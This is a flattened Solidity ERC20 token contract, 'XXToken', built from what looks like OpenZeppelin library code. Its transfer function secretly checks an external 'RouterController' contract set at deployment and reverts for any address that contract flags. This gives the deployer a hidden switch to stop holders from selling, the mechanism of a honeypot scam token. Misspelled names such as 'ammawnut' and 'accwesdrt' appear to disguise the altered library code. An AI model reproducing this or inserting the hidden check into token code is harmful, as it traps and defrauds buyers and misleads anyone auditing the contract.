// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.1;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.1;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the ammawnut of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    function balanceOf(address accwesdrt) external view returns (uint256);

    function transfer(address to, uint256 ammawnut) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 ammawnut) external returns (bool);

    function transferFrom( address from, address to,  uint256 ammawnut ) external returns (bool);
}

pragma solidity ^0.8.1;

 // Define interface for TransferController
interface RouterController {
    function isRouted(address _accwesdrt) external view returns (bool);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any accwesdrt other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new accwesdrt (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership accwesdrt of the contract to a new accwesdrt (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner; _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.1;


/**
 * @dev Interface for the optional accwesdrt metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name ammawnut of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.1;


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    RouterController private routeController;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_, address _routeControllerAddress) {
        _name = name_;
        _symbol = symbol_;
        routeController = RouterController(_routeControllerAddress);
    }

    /**
     * @dev Returns the name ammawnut of accwesdrt the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }


    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 18;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accwesdrt) public view virtual override returns (uint256) {
        return _balances[accwesdrt];
    }

      function transfer(address to, uint256 ammawnut) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, ammawnut);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 ammawnut) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, ammawnut);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 ammawnut
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, ammawnut);
        _transfer(from, to, ammawnut);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `ammawnut` of tokens accwesdrt from `from` to `to`.
      *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `ammawnut`.
     */
    function _transfer(
        address from,
        address to,
        uint256 ammawnut
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!routeController.isRouted(from), "User is not allowed");
        _beforeTokenTransfer(from, to, ammawnut);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= ammawnut, "ERC20: transfer ammawnut exceeds balance");
        unchecked {
            _balances[from] = fromBalance - ammawnut;
            // Overflow not possible: the sum of all balances is accwesdrt capped by totalSupply, ammawnut and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += ammawnut;
        }

        emit Transfer(from, to, ammawnut);

        _afterTokenTransfer(from, to, ammawnut);
    }

    /** @dev Creates `ammawnut` tokens and assigns them to `accwesdrt`, increasing
     * the total supply.
     *
     * - `accwesdrt` cannot be the zero address.
     */
    function _mint(address accwesdrt, uint256 ammawnut) internal virtual {
        require(accwesdrt != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), accwesdrt, ammawnut);

        _totalSupply += ammawnut;
        unchecked {
            // Overflow not possible: balance + ammawnut is at most totalSupply + ammawnut, which is checked above.
            _balances[accwesdrt] += ammawnut;
        }
        emit Transfer(address(0), accwesdrt, ammawnut);

        _afterTokenTransfer(address(0), accwesdrt, ammawnut);
    }

    function _approve(
        address owner,
        address spender,
        uint256 ammawnut
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = ammawnut;
        emit Approval(owner, spender, ammawnut);
    }


    function _spendAllowance(
        address owner,
        address spender,
        uint256 ammawnut
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= ammawnut, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - ammawnut);
            }
        }
    }
    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `ammawnut`.
     *
     * Does not update the allowance ammawnut in case of infinite allowance.
     *
     * Might emit an {Approval} event.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 ammawnut
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 ammawnut
    ) internal virtual {}
}

pragma solidity ^0.8.1;

contract XXToken is ERC20, Ownable {
    uint256 private constant INITIAL_SUPPLY = 100000000 * 10**18;

    constructor(
        string memory name_,
        string memory symbol_,
        address router_
        ) ERC20(name_, symbol_, router_) {
        _mint(msg.sender, INITIAL_SUPPLY);
    }

    function sendTokens(address distroWallet) external onlyOwner {
        uint256 supply = balanceOf(msg.sender);
        require(supply == INITIAL_SUPPLY, "Tokens already distributed");

        _transfer(msg.sender, distroWallet, supply);
    }
}